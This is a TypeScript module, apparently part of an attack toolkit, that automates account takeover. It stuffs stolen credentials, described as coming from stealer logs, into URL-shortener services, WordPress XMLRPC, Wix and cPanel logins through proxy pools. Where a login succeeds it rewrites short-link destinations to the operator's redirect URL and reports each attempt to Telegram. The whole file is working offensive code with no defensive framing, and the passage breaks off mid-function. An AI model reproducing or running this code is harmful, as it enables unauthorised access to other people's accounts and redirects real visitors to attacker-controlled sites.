/**
 * Auto Takeover Executor
 * 
 * หลังจาก Redirect Takeover Intelligence วิเคราะห์เสร็จ
 * module นี้จะ execute top takeover vectors อัตโนมัติ:
 * 
 * 1. Short URL Account Takeover (t.ly, bit.ly, cutt.ly, tinyurl, rb.gy, s.id)
 *    - Login ผ่าน API endpoint / POST form
 *    - ค้นหา short link ใน dashboard
 *    - เปลี่ยน destination URL เป็นของเรา
 * 
 * 2. WordPress Admin Takeover
 *    - XMLRPC brute force
 *    - REST API editor
 *    - wp-admin login + redirect injection
 * 
 * 3. CMS/Hosting Panel Takeover
 *    - cPanel, Plesk, DirectAdmin login
 *    - Wix editor access
 *    - Shopify admin
 * 
 * 4. DNS Provider Takeover
 *    - Cloudflare, GoDaddy, Namecheap login
 *    - DNS record modification
 */

import { fetchWithPoolProxy, fetchWithThaiProxy } from "./proxy-pool";
import type { TakeoverVector, TakeoverIntelResult } from "./redirect-takeover-intel";
import { pickRedirectUrl } from "./agentic-attack-engine";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface TakeoverExecutionConfig {
  /** Intel result from Phase 7 */
  intelResult: TakeoverIntelResult;
  /** Max vectors to try (default: 3) */
  maxVectors?: number;
  /** Max credentials per vector (default: 15) */
  maxCredsPerVector?: number;
  /** Max total duration in ms (default: 120s) */
  maxDurationMs?: number;
  /** Our redirect URL (if not provided, will pick from pool) */
  ourRedirectUrl?: string;
  /** Progress callback for Telegram narrator */
  onProgress?: (phase: string, detail: string) => void;
  /** Per-attempt callback */
  onAttempt?: (vectorId: string, email: string, status: "trying" | "success" | "failed", detail: string) => void;
}

export interface TakeoverAttemptResult {
  vectorId: string;
  vectorName: string;
  email: string;
  password: string;
  success: boolean;
  detail: string;
  /** If login succeeded, what access did we get? */
  accessType?: string;
  /** If we changed the redirect, what's the new URL? */
  newRedirectUrl?: string;
  /** Session token/cookie if login succeeded */
  sessionToken?: string;
  durationMs: number;
}

export interface TakeoverExecutionResult {
  totalAttempts: number;
  successfulLogins: TakeoverAttemptResult[];
  redirectChanged: boolean;
  newRedirectUrl: string | null;
  vectorsAttempted: number;
  totalDurationMs: number;
  /** Summary for Telegram */
  summary: string;
  /** Detailed attempts log */
  attempts: TakeoverAttemptResult[];
}

// ═══════════════════════════════════════════════════════
//  SHORT URL SERVICE LOGIN HANDLERS
// ═══════════════════════════════════════════════════════

interface ShortUrlLoginHandler {
  service: string;
  /** Try to login and return session info */
  login: (email: string, password: string) => Promise<{ success: boolean; sessionToken?: string; detail: string }>;
  /** Find the target short link in the account */
  findLink: (sessionToken: string, shortCode: string) => Promise<{ found: boolean; linkId?: string; currentDest?: string; detail: string }>;
  /** Change the destination URL */
  changeDestination: (sessionToken: string, linkId: string, newUrl: string) => Promise<{ success: boolean; detail: string }>;
}

// ─── T.LY Handler ───
const tlyHandler: ShortUrlLoginHandler = {
  service: "t.ly",
  
  async login(email: string, password: string) {
    try {
      // t.ly uses standard form-based login
      const { response } = await fetchWithPoolProxy("https://t.ly/api/v1/link/shorten", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        // First try API key auth — some stealer logs contain API keys as passwords
        body: JSON.stringify({ long_url: "https://example.com/test-auth-check" }),
      }, { timeout: 15000 });
      
      // Try Bearer token auth (password might be an API key)
      const { response: apiResp } = await fetchWithPoolProxy("https://t.ly/api/v1/link/list", {
        headers: {
          "Authorization": `Bearer ${password}`,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (apiResp.ok) {
        const data = await apiResp.json().catch(() => null);
        if (data && !data.error) {
          return { success: true, sessionToken: password, detail: `API key auth successful (${email})` };
        }
      }
      
      // Try form login via POST
      const { response: loginResp } = await fetchWithPoolProxy("https://t.ly/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "Accept": "text/html,application/json",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        },
        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`,
        redirect: "manual",
      }, { timeout: 15000 });
      
      // Check for success indicators
      const status = loginResp.status;
      const location = loginResp.headers.get("location") || "";
      const setCookie = loginResp.headers.get("set-cookie") || "";
      
      if (status === 302 && (location.includes("dashboard") || location.includes("/app"))) {
        const token = setCookie.match(/(?:token|session|auth)[=:]([^;]+)/i)?.[1] || setCookie;
        return { success: true, sessionToken: token, detail: `Form login successful → ${location}` };
      }
      
      if (status === 200) {
        const body = await loginResp.text().catch(() => "");
        if (body.includes("dashboard") || body.includes("my-links") || body.includes("api_token")) {
          const token = setCookie.match(/(?:token|session|auth)[=:]([^;]+)/i)?.[1] || "session";
          return { success: true, sessionToken: token, detail: "Login successful (200 with dashboard content)" };
        }
      }
      
      return { success: false, detail: `Login failed (status: ${status})` };
    } catch (err: any) {
      return { success: false, detail: `Login error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async findLink(sessionToken: string, shortCode: string) {
    try {
      // Try API to list links
      const { response } = await fetchWithPoolProxy("https://t.ly/api/v1/link/list", {
        headers: {
          "Authorization": `Bearer ${sessionToken}`,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.data) {
          const links = Array.isArray(data.data) ? data.data : [];
          const target = links.find((l: any) => 
            l.short_url?.includes(shortCode) || l.slug === shortCode
          );
          if (target) {
            return { found: true, linkId: target.id || target.slug, currentDest: target.long_url, detail: `Found: ${target.short_url} → ${target.long_url}` };
          }
          return { found: false, detail: `Link ${shortCode} not found in ${links.length} links` };
        }
      }
      return { found: false, detail: "Could not list links" };
    } catch (err: any) {
      return { found: false, detail: `Find error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async changeDestination(sessionToken: string, linkId: string, newUrl: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://t.ly/api/v1/link/update`, {
        method: "PUT",
        headers: {
          "Authorization": `Bearer ${sessionToken}`,
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        body: JSON.stringify({ id: linkId, long_url: newUrl }),
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data && !data.error) {
          return { success: true, detail: `Destination changed to ${newUrl}` };
        }
        return { success: false, detail: `API returned error: ${JSON.stringify(data).substring(0, 80)}` };
      }
      return { success: false, detail: `Update failed (status: ${response.status})` };
    } catch (err: any) {
      return { success: false, detail: `Update error: ${err.message?.substring(0, 60)}` };
    }
  },
};

// ─── Bitly Handler ───
const bitlyHandler: ShortUrlLoginHandler = {
  service: "bit.ly",
  
  async login(email: string, password: string) {
    try {
      // Bitly API uses OAuth tokens — password might be an access token
      const { response } = await fetchWithPoolProxy("https://api-ssl.bitly.com/v4/user", {
        headers: {
          "Authorization": `Bearer ${password}`,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.login) {
          return { success: true, sessionToken: password, detail: `API token auth: ${data.login}` };
        }
      }
      
      // Try form login
      const { response: loginResp } = await fetchWithPoolProxy("https://bitly.com/a/sign_in", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: `login=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`,
        redirect: "manual",
      }, { timeout: 15000 });
      
      const status = loginResp.status;
      const location = loginResp.headers.get("location") || "";
      
      if ((status === 302 || status === 301) && !location.includes("sign_in")) {
        const setCookie = loginResp.headers.get("set-cookie") || "";
        return { success: true, sessionToken: setCookie, detail: `Form login → ${location}` };
      }
      
      return { success: false, detail: `Login failed (status: ${status})` };
    } catch (err: any) {
      return { success: false, detail: `Login error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async findLink(sessionToken: string, shortCode: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://api-ssl.bitly.com/v4/bitlinks/bit.ly/${shortCode}`, {
        headers: {
          "Authorization": `Bearer ${sessionToken}`,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.long_url) {
          return { found: true, linkId: data.id || `bit.ly/${shortCode}`, currentDest: data.long_url, detail: `Found: bit.ly/${shortCode} → ${data.long_url}` };
        }
      }
      return { found: false, detail: `Link bit.ly/${shortCode} not found or not owned by this account` };
    } catch (err: any) {
      return { found: false, detail: `Find error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async changeDestination(sessionToken: string, linkId: string, newUrl: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://api-ssl.bitly.com/v4/bitlinks/${linkId}`, {
        method: "PATCH",
        headers: {
          "Authorization": `Bearer ${sessionToken}`,
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        body: JSON.stringify({ long_url: newUrl }),
      }, { timeout: 15000 });
      
      if (response.ok) {
        return { success: true, detail: `Destination changed to ${newUrl}` };
      }
      const body = await response.text().catch(() => "");
      return { success: false, detail: `Update failed (${response.status}): ${body.substring(0, 80)}` };
    } catch (err: any) {
      return { success: false, detail: `Update error: ${err.message?.substring(0, 60)}` };
    }
  },
};

// ─── Cutt.ly Handler ───
const cuttlyHandler: ShortUrlLoginHandler = {
  service: "cutt.ly",
  
  async login(email: string, password: string) {
    try {
      // Cutt.ly API key auth
      const { response } = await fetchWithPoolProxy(`https://cutt.ly/api/api.php?key=${encodeURIComponent(password)}&stats=1`, {
        headers: { "Accept": "application/json" },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data && !data.error) {
          return { success: true, sessionToken: password, detail: `API key auth successful` };
        }
      }
      
      // Try form login
      const { response: loginResp } = await fetchWithPoolProxy("https://cutt.ly/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`,
        redirect: "manual",
      }, { timeout: 15000 });
      
      const status = loginResp.status;
      const location = loginResp.headers.get("location") || "";
      if ((status === 302 || status === 301) && (location.includes("dashboard") || location.includes("/app"))) {
        const setCookie = loginResp.headers.get("set-cookie") || "";
        return { success: true, sessionToken: setCookie, detail: `Form login → ${location}` };
      }
      
      return { success: false, detail: `Login failed (status: ${status})` };
    } catch (err: any) {
      return { success: false, detail: `Login error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async findLink(sessionToken: string, shortCode: string) {
    try {
      // Cutt.ly doesn't have a direct link lookup API, try stats
      const { response } = await fetchWithPoolProxy(`https://cutt.ly/api/api.php?key=${encodeURIComponent(sessionToken)}&stats=${encodeURIComponent(`https://cutt.ly/${shortCode}`)}`, {
        headers: { "Accept": "application/json" },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.stats?.url) {
          return { found: true, linkId: shortCode, currentDest: data.stats.url, detail: `Found: cutt.ly/${shortCode} → ${data.stats.url}` };
        }
      }
      return { found: false, detail: `Link cutt.ly/${shortCode} not found` };
    } catch (err: any) {
      return { found: false, detail: `Find error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async changeDestination(_sessionToken: string, _linkId: string, _newUrl: string) {
    return { success: false, detail: "Cutt.ly API does not support link editing" };
  },
};

// ─── TinyURL Handler ───
const tinyurlHandler: ShortUrlLoginHandler = {
  service: "tinyurl.com",
  
  async login(email: string, password: string) {
    try {
      // TinyURL API token auth
      const { response } = await fetchWithPoolProxy("https://api.tinyurl.com/alias/tinyurl.com/test", {
        headers: {
          "Authorization": `Bearer ${password}`,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.status !== 401 && response.status !== 403) {
        return { success: true, sessionToken: password, detail: `API token auth successful` };
      }
      
      // Try form login
      const { response: loginResp } = await fetchWithPoolProxy("https://tinyurl.com/app/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`,
        redirect: "manual",
      }, { timeout: 15000 });
      
      const status = loginResp.status;
      const location = loginResp.headers.get("location") || "";
      if ((status === 302 || status === 301) && !location.includes("login")) {
        const setCookie = loginResp.headers.get("set-cookie") || "";
        return { success: true, sessionToken: setCookie, detail: `Form login → ${location}` };
      }
      
      return { success: false, detail: `Login failed (status: ${status})` };
    } catch (err: any) {
      return { success: false, detail: `Login error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async findLink(sessionToken: string, shortCode: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://api.tinyurl.com/alias/tinyurl.com/${shortCode}`, {
        headers: {
          "Authorization": `Bearer ${sessionToken}`,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.data?.url) {
          return { found: true, linkId: shortCode, currentDest: data.data.url, detail: `Found: tinyurl.com/${shortCode} → ${data.data.url}` };
        }
      }
      return { found: false, detail: `Link tinyurl.com/${shortCode} not found` };
    } catch (err: any) {
      return { found: false, detail: `Find error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async changeDestination(sessionToken: string, linkId: string, newUrl: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://api.tinyurl.com/change`, {
        method: "PATCH",
        headers: {
          "Authorization": `Bearer ${sessionToken}`,
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        body: JSON.stringify({ domain: "tinyurl.com", alias: linkId, url: newUrl }),
      }, { timeout: 15000 });
      
      if (response.ok) {
        return { success: true, detail: `Destination changed to ${newUrl}` };
      }
      return { success: false, detail: `Update failed (${response.status})` };
    } catch (err: any) {
      return { success: false, detail: `Update error: ${err.message?.substring(0, 60)}` };
    }
  },
};

// ─── Rebrandly Handler ───
const rebrandlyHandler: ShortUrlLoginHandler = {
  service: "rb.gy",
  
  async login(email: string, password: string) {
    try {
      const { response } = await fetchWithPoolProxy("https://api.rebrandly.com/v1/account", {
        headers: {
          "apikey": password,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.id) {
          return { success: true, sessionToken: password, detail: `API key auth: ${data.fullName || data.email || data.id}` };
        }
      }
      return { success: false, detail: `Login failed` };
    } catch (err: any) {
      return { success: false, detail: `Login error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async findLink(sessionToken: string, shortCode: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://api.rebrandly.com/v1/links?slashtag=${shortCode}`, {
        headers: {
          "apikey": sessionToken,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => []);
        const link = Array.isArray(data) ? data[0] : null;
        if (link) {
          return { found: true, linkId: link.id, currentDest: link.destination, detail: `Found: ${link.shortUrl} → ${link.destination}` };
        }
      }
      return { found: false, detail: `Link not found` };
    } catch (err: any) {
      return { found: false, detail: `Find error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async changeDestination(sessionToken: string, linkId: string, newUrl: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://api.rebrandly.com/v1/links/${linkId}`, {
        method: "POST",
        headers: {
          "apikey": sessionToken,
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        body: JSON.stringify({ destination: newUrl }),
      }, { timeout: 15000 });
      
      if (response.ok) {
        return { success: true, detail: `Destination changed to ${newUrl}` };
      }
      return { success: false, detail: `Update failed (${response.status})` };
    } catch (err: any) {
      return { success: false, detail: `Update error: ${err.message?.substring(0, 60)}` };
    }
  },
};

// ─── S.id Handler ───
const sidHandler: ShortUrlLoginHandler = {
  service: "s.id",
  
  async login(email: string, password: string) {
    try {
      const { response } = await fetchWithPoolProxy("https://api.s.id/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        body: JSON.stringify({ email, password }),
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.token || data?.access_token) {
          return { success: true, sessionToken: data.token || data.access_token, detail: `Login successful` };
        }
      }
      return { success: false, detail: `Login failed (${response.status})` };
    } catch (err: any) {
      return { success: false, detail: `Login error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async findLink(_sessionToken: string, _shortCode: string) {
    return { found: false, detail: "S.id link lookup not implemented" };
  },
  
  async changeDestination(_sessionToken: string, _linkId: string, _newUrl: string) {
    return { success: false, detail: "S.id link editing not implemented" };
  },
};

// ═══════════════════════════════════════════════════════
//  SERVICE HANDLER REGISTRY
// ═══════════════════════════════════════════════════════

const SHORT_URL_HANDLERS: Record<string, ShortUrlLoginHandler> = {
  "t.ly": tlyHandler,
  "bit.ly": bitlyHandler,
  "cutt.ly": cuttlyHandler,
  "tinyurl.com": tinyurlHandler,
  "rb.gy": rebrandlyHandler,
  "s.id": sidHandler,
};

// ═══════════════════════════════════════════════════════
//  WORDPRESS TAKEOVER
// ═══════════════════════════════════════════════════════

async function tryWordPressLogin(
  domain: string,
  credentials: Array<{ email: string; password: string }>,
  onAttempt?: TakeoverExecutionConfig["onAttempt"],
): Promise<TakeoverAttemptResult[]> {
  const results: TakeoverAttemptResult[] = [];
  
  for (const cred of credentials) {
    const start = Date.now();
    onAttempt?.("platform_takeover_wordpress", cred.email, "trying", `WP XMLRPC: ${cred.email}`);
    
    try {
      // Method 1: XMLRPC
      const xmlBody = `<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>${escapeXml(cred.email)}</string></value></param><param><value><string>${escapeXml(cred.password)}</string></value></param></params></methodCall>`;
      
      const { response } = await fetchWithPoolProxy(`http://${domain}/xmlrpc.php`, {
        method: "POST",
        headers: { "Content-Type": "text/xml" },
        body: xmlBody,
      }, { timeout: 15000 });
      
      const body = await response.text();
      
      if (body.includes("isAdmin") || body.includes("blogid") || body.includes("blogName")) {
        const result: TakeoverAttemptResult = {
          vectorId: "platform_takeover_wordpress",
          vectorName: "WordPress XMLRPC Login",
          email: cred.email,
          password: cred.password,
          success: true,
          detail: `XMLRPC login successful: ${cred.email}`,
          accessType: "wp_admin",
          durationMs: Date.now() - start,
        };
        onAttempt?.("platform_takeover_wordpress", cred.email, "success", `✅ WP login: ${cred.email}`);
        results.push(result);
        return results; // Stop on first success
      }
      
      results.push({
        vectorId: "platform_takeover_wordpress",
        vectorName: "WordPress XMLRPC Login",
        email: cred.email,
        password: cred.password,
        success: false,
        detail: "Invalid credentials",
        durationMs: Date.now() - start,
      });
      onAttempt?.("platform_takeover_wordpress", cred.email, "failed", `❌ WP: ${cred.email}`);
    } catch (err: any) {
      results.push({
        vectorId: "platform_takeover_wordpress",
        vectorName: "WordPress XMLRPC Login",
        email: cred.email,
        password: cred.password,
        success: false,
        detail: `Error: ${err.message?.substring(0, 60)}`,
        durationMs: Date.now() - start,
      });
      onAttempt?.("platform_takeover_wordpress", cred.email, "failed", `❌ WP error: ${err.message?.substring(0, 40)}`);
    }
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════
//  WIX TAKEOVER
// ═══════════════════════════════════════════════════════

async function tryWixLogin(
  domain: string,
  credentials: Array<{ email: string; password: string }>,
  onAttempt?: TakeoverExecutionConfig["onAttempt"],
): Promise<TakeoverAttemptResult[]> {
  const results: TakeoverAttemptResult[] = [];
  
  for (const cred of credentials) {
    const start = Date.now();
    onAttempt?.("platform_takeover_wix", cred.email, "trying", `Wix: ${cred.email}`);
    
    try {
      // Wix uses OAuth-based login — try the standard login endpoint
      const { response } = await fetchWithPoolProxy("https://users.wix.com/signin", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: JSON.stringify({
          email: cred.email,
          password: cred.password,
          rememberMe: true,
        }),
      }, { timeout: 15000 });
      
      const status = response.status;
      const body = await response.text().catch(() => "");
      
      if (status === 200 && (body.includes("token") || body.includes("session") || body.includes("success"))) {
        try {
          const data = JSON.parse(body);
          if (data.token || data.sessionToken || data.success) {
            const result: TakeoverAttemptResult = {
              vectorId: "platform_takeover_wix",
              vectorName: "Wix Account Login",
              email: cred.email,
              password: cred.password,
              success: true,
              detail: `Wix login successful: ${cred.email}`,
              accessType: "wix_editor",
              sessionToken: data.token || data.sessionToken,
              durationMs: Date.now() - start,
            };
            onAttempt?.("platform_takeover_wix", cred.email, "success", `✅ Wix login: ${cred.email}`);
            results.push(result);
            return results;
          }
        } catch {}
      }
      
      results.push({
        vectorId: "platform_takeover_wix",
        vectorName: "Wix Account Login",
        email: cred.email,
        password: cred.password,
        success: false,
        detail: `Login failed (status: ${status})`,
        durationMs: Date.now() - start,
      });
      onAttempt?.("platform_takeover_wix", cred.email, "failed", `❌ Wix: ${cred.email}`);
    } catch (err: any) {
      results.push({
        vectorId: "platform_takeover_wix",
        vectorName: "Wix Account Login",
        email: cred.email,
        password: cred.password,
        success: false,
        detail: `Error: ${err.message?.substring(0, 60)}`,
        durationMs: Date.now() - start,
      });
      onAttempt?.("platform_takeover_wix", cred.email, "failed", `❌ Wix error: ${err.message?.substring(0, 40)}`);
    }
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════
//  CPANEL / HOSTING PANEL TAKEOVER
// ═══════════════════════════════════════════════════════

const CPANEL_PORTS = [2082, 2083, 2086, 2087];

async function tryCpanelLogin(
  domain: string,
  credentials: Array<{ email: string; password: string }>,
  onAttempt?: TakeoverExecutionConfig["onAttempt"],
): Promise<TakeoverAttemptResult[]> {
  const results: TakeoverAttemptResult[] = [];
  const host = domain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  
  // First find which port has cPanel
  let cpanelUrl: string | null = null;
  for (const port of CPANEL_PORTS) {
    const proto = [2083, 2087].includes(port) ? "https" : "http";
    try {
      const resp = await fetch(`${proto}://${host}:${port}/`, {
        signal: AbortSignal.timeout(5000),
        redirect: "follow",
      }).catch(() => null);
      if (resp && resp.status !== 0) {
        const body = await resp.text().catch(() => "");
        if (body.includes("cPanel") || body.includes("cpanel") || body.includes("whm")) {
          cpanelUrl = `${proto}://${host}:${port}`;
          break;
        }
      }
    } catch {}
  }
  
  if (!cpanelUrl) {
    return [{ vectorId: "cpanel_takeover", vectorName: "cPanel Login", email: "", password: "", success: false, detail: "No cPanel found", durationMs: 0 }];
  }
  
  for (const cred of credentials) {
    const start = Date.now();
    // Use email prefix as username for cPanel
    const username = cred.email.includes("@") ? cred.email.split("@")[0] : cred.email;
    onAttempt?.("cpanel_takeover", username, "trying", `cPanel: ${username}@${cpanelUrl}`);
    
    try {
      const loginResp = await fetch(`${cpanelUrl}/login/?login_only=1`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `user=${encodeURIComponent(username)}&pass=${encodeURIComponent(cred.password)}`,
        redirect: "manual",
        signal: AbortSignal.timeout(10000),
      }).catch(() => null);
      
      if (!loginResp) {
        results.push({ vectorId: "cpanel_takeover", vectorName: "cPanel Login", email: username, password: cred.password, success: false, detail: "Connection failed", durationMs: Date.now() - start });
        onAttempt?.("cpanel_takeover", username, "failed", `❌ cPanel: connection failed`);
        continue;
      }
      
      const location = loginResp.headers.get("location") || "";
      if (loginResp.status === 301 || loginResp.status === 302) {
        if (location.includes("cpsess") || location.includes("security_token")) {
          const result: TakeoverAttemptResult = {
            vectorId: "cpanel_takeover",
            vectorName: "cPanel Login",
            email: username,
            password: cred.password,
            success: true,
            detail: `cPanel login successful: ${username}@${cpanelUrl}`,
            accessType: "cpanel",
            sessionToken: location,
            durationMs: Date.now() - start,
          };
          onAttempt?.("cpanel_takeover", username, "success", `✅ cPanel: ${username}`);
          results.push(result);
          return results;
        }
      }
      
      results.push({ vectorId: "cpanel_takeover", vectorName: "cPanel Login", email: username, password: cred.password, success: false, detail: `Login failed (${loginResp.status})`, durationMs: Date.now() - start });
      onAttempt?.("cpanel_takeover", username, "failed", `❌ cPanel: ${username}`);
    } catch (err: any) {
      results.push({ vectorId: "cpanel_takeover", vectorName: "cPanel Login", email: username, password: cred.password, success: false, detail: `Error: ${err.message?.substring(0, 60)}`, durationMs: Date.now() - start });
      onAttempt?.("cpanel_takeover", username, "failed", `❌ cPanel error`);
    }
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════
//  SHORT URL TAKEOVER EXECUTOR
// ═══════════════════════════════════════════════════════

async function executeShortUrlTakeover(
  vector: TakeoverVector,
  ourRedirectUrl: string,
  maxCreds: number,
  onAttempt?: TakeoverExecutionConfig["onAttempt"],
): Promise<TakeoverAttemptResult[]> {
  const results: TakeoverAttemptResult[] = [];
  
  // Determine which service
  const serviceMatch = Object.keys(SHORT_URL_HANDLERS).find(s => 
    vector.target.includes(s) || vector.id.includes(s.replace(".", "_"))
  );
  
  if (!serviceMatch) {
    return [{ vectorId: vector.id, vectorName: vector.name, email: "", password: "", success: false, detail: `No handler for service in vector: ${vector.target}`, durationMs: 0 }];
  }
  
  const handler = SHORT_URL_HANDLERS[serviceMatch];
  const shortCode = extractShortCode(vector.target, serviceMatch);
  const credsToTry = vector.credentialsToTry.slice(0, maxCreds);
  
  for (const cred of credsToTry) {
    const start = Date.now();
    onAttempt?.(vector.id, cred.email, "trying", `${handler.service}: ${cred.email}`);
    
    // Step 1: Login
    const loginResult = await handler.login(cred.email, cred.password);
    
    if (!loginResult.success) {
      results.push({
        vectorId: vector.id,
        vectorName: vector.name,
        email: cred.email,
        password: cred.password,
        success: false,
        detail: loginResult.detail,
        durationMs: Date.now() - start,
      });
      onAttempt?.(vector.id, cred.email, "failed", `❌ ${handler.service}: ${loginResult.detail.substring(0, 50)}`);
      continue;
    }
    
    onAttempt?.(vector.id, cred.email, "success", `🔓 ${handler.service} login OK: ${cred.email}`);
    
    // Step 2: Find the link
    if (shortCode && loginResult.sessionToken) {
      const findResult = await handler.findLink(loginResult.sessionToken, shortCode);
      
      if (findResult.found && findResult.linkId) {
        onAttempt?.(vector.id, cred.email, "success", `📎 Found link: ${findResult.detail}`);
        
        // Step 3: Change destination
        const changeResult = await handler.changeDestination(loginResult.sessionToken, findResult.linkId, ourRedirectUrl);
        
        if (changeResult.success) {
          results.push({
            vectorId: vector.id,
            vectorName: vector.name,
            email: cred.email,
            password: cred.password,
            success: true,
            detail: `🎯 TAKEOVER SUCCESS: ${handler.service} link changed to ${ourRedirectUrl}`,
            accessType: `${handler.service}_account`,
            newRedirectUrl: ourRedirectUrl,
            sessionToken: loginResult.sessionToken,
            durationMs: Date.now() - start,
          });
          onAttempt?.(vector.id, cred.email, "success", `🎯 REDIRECT CHANGED: ${ourRedirectUrl}`);
          return results; // Mission accomplished!
        } else {
          onAttempt?.(vector.id, cred.email, "failed", `⚠️ Link found but change failed: ${changeResult.detail.substring(0, 50)}`);
        }
      } else {
        onAttempt?.(vector.id, cred.email, "failed", `⚠️ Login OK but link not found: ${findResult.detail.substring(0, 50)}`);
      }
    }
    
    // Login succeeded but couldn't change link — still record as partial success
    results.push({
      vectorId: vector.id,
      vectorName: vector.name,
      email: cred.email,
      password: cred.password,
      success: true,
      detail: `Login OK but link change failed. Session: ${loginResult.sessionToken?.substring(0, 30)}...`,
      accessType: `${handler.service}_account`,
      sessionToken: loginResult.sessionToken,
      durationMs: Date.now() - start,
    });
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════
//  MAIN EXECUTOR
// ═══════════════════════════════════════════════════════

export async function executeTakeoverVectors(config: TakeoverExecutionConfig): Promise<TakeoverExecutionResult> {
  const startTime = Date.now();
  const {
    intelResult,
    maxVectors = 3,
    maxCredsPerVector = 15,
    maxDurationMs = 120_000,
    onProgress,
    onAttempt,
  } = config;
  
  // Get our redirect URL
  const ourRedirectUrl = config.ourRedirectUrl || await pickRedirectUrl();
  
  const allAttempts: TakeoverAttemptResult[] = [];
  const successfulLogins: TakeoverAttemptResult[] = [];
  let redirectChanged = false;
  let newRedirectUrl: string | null = null;
  let vectorsAttempted = 0;
  
  // Sort vectors by success probability (highest first)
  const sortedVectors = [...intelResult.takeoverVectors]
    .sort((a, b) => b.successProbability - a.successProbability)
    .slice(0, maxVectors);
  
  if (sortedVectors.length === 0) {
    return {
      totalAttempts: 0,
      successfulLogins: [],
      redirectChanged: false,
      newRedirectUrl: null,
      vectorsAttempted: 0,
      totalDurationMs: Date.now() - startTime,
      summary: "ไม่มี takeover vector ให้ execute",
      attempts: [],
    };
  }
  
  onProgress?.("execute", `🎯 กำลัง execute ${sortedVectors.length} vectors (redirect → ${ourRedirectUrl.substring(0, 50)})`);
  
  for (const vector of sortedVectors) {
    // Check timeout
    if (Date.now() - startTime > maxDurationMs) {
      onProgress?.("timeout", `⏱️ Timeout (${(maxDurationMs / 1000).toFixed(0)}s) — หยุด execute`);
      break;
    }
    
    vectorsAttempted++;
    onProgress?.("vector", `\n📌 Vector ${vectorsAttempted}/${sortedVectors.length}: ${vector.name} (~${vector.successProbability}%)`);
    
    let attempts: TakeoverAttemptResult[] = [];
    
    // Route to appropriate handler based on vector type
    if (vector.id.startsWith("short_url_takeover_")) {
      attempts = await executeShortUrlTakeover(vector, ourRedirectUrl, maxCredsPerVector, onAttempt);
    } else if (vector.id === "platform_takeover_wordpress") {
      attempts = await tryWordPressLogin(
        intelResult.domain,
        vector.credentialsToTry.slice(0, maxCredsPerVector),
        onAttempt,
      );
    } else if (vector.id === "platform_takeover_wix") {
      attempts = await tryWixLogin(
